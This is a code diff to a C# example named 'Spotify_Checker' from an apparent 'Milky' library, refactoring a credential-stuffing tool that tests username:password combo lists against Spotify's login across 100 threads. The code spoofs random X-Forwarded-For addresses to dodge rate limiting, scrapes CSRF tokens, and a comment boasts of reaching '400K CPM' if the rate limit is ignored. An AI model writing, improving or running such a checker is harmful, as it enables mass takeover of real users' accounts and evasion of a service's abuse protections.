@@ -11,6 +11,10 @@ namespace Milky.Examples
 {
     class Spotify_Checker
     {
+        private static readonly HttpClient _httpClient = new HttpClient();
+        private static readonly Random _random = new Random();
+        private static readonly object _locker = new object();
+
         static async Task Main()
         {
             var combos = new List<Combo>();
@@ -31,23 +35,14 @@ namespace Milky.Examples
 
             var check = new MilkyCheck()
                 .WithCombos(combos)
-                .WithArgs(new object[]
-                {
-                    new HttpClient(),
-                    new Random(),
-                    new object()
-                })
                 .WithSettings(new CheckSettings
                 {
                     Threads = 100,
+                    OutputInConsole = true,
                     OutputInvalids = false
                 })
-                .WithCheckingProcess(async (combo, proxy, args) =>
+                .WithCheckingProcess(async (combo, proxy) =>
                 {
-                    var httpClient = (HttpClient)args[0];
-                    var random = (Random)args[1];
-                    var locker = args[2];
-
                     var result = CheckResult.Unknown;
                     Dictionary<string, string> captures = null;
 
@@ -55,9 +50,9 @@ namespace Milky.Examples
 
                     while (result == CheckResult.Unknown)
                     {
-                        lock (locker)
+                        lock (_locker)
                         {
-                            randomIp = string.Join(".", random.Next(1, 256), random.Next(0, 256), random.Next(0, 256), random.Next(0, 256));
+                            randomIp = string.Join(".", _random.Next(1, 256), _random.Next(0, 256), _random.Next(0, 256), _random.Next(0, 256));
                         }
 
                         try
@@ -65,7 +60,7 @@ namespace Milky.Examples
                             var requestMessage1 = new HttpRequestMessage(HttpMethod.Get, "https://accounts.spotify.com/en/login");
                             requestMessage1.Headers.TryAddWithoutValidation("X-Forwarded-For", randomIp);
 
-                            var responseMessage1 = await httpClient.SendAsync(requestMessage1);
+                            var responseMessage1 = await _httpClient.SendAsync(requestMessage1);
 
                             string csrfToken = Regex.Match(responseMessage1.Headers.ToString(), "csrf_token=(.*?);").Groups[1].Value;
                             if (string.IsNullOrEmpty(csrfToken)) continue; // Sadly, this checker triggers Spotify Rate limit. Ignoring rate limit, it is able to reach a solid 400K CPM!
@@ -84,7 +79,7 @@ namespace Milky.Examples
                             requestMessage2.Headers.TryAddWithoutValidation("X-Forwarded-For", randomIp);
                             requestMessage2.Headers.TryAddWithoutValidation("User-Agent", "Mozilla");
 
-                            var responseMessage2 = await httpClient.SendAsync(requestMessage2);
+                            var responseMessage2 = await _httpClient.SendAsync(requestMessage2);
 
                             var content2 = await responseMessage2.Content.ReadAsStringAsync();
 
